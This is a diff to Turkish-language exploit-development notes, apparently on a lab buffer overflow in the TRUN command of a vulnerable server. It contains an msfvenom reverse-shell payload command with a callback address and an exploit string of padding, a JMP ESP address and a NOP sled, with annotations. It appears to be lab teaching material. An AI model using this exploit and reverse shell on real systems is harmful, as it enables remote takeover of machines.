@@ -70,6 +70,7 @@ Exploit için öncelilkle bir reverse shell koduna ihtiyacımız var.
 ```
 msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread -f c -a x86 -b "\x00"
 ```
+```
 "-p": Payload Türü
 "LHOST": Geri Dönüş Sağlanacak Sunucu
 "LPORT": Geri Dönüş Sağlanacak Sunucunun Portu
@@ -77,7 +78,19 @@ msfvenom -p windows/shell_reverse_tcp LHOST=10.0.2.4 LPORT=4444 EXITFUNC=thread 
 "-f": C dilinde derlenmesi
 "-a": Architecture
 "-b": Bad Characters
+```
 
+Shell kodunu ürettikten sonra karşı tarafa yollamak kalıyor. Eklediğim exploit scripti bu işlemi yapıyor. Satırları açıklamam gerekirse:
+```
+stringToSend = "TRUN /.:/" + "A" * 2003 + "\xaf\x11\x50\x62" + "\x90" * 32 + payload
+```
+
+```
+"TRUN /.:/" + "A" * 2003 # Çökertecek kadar kod yolla
+"\xaf\x11\x50\x62" # JMP ESP -> Kodumu Çalıştır
+"\x90" * 32 # NOP Code
+"payload" -> MSFVenom ile ürettiğimiz payload
+```
 # GDB
 ```
 ● disassemble main - look at the assembly code of the main function
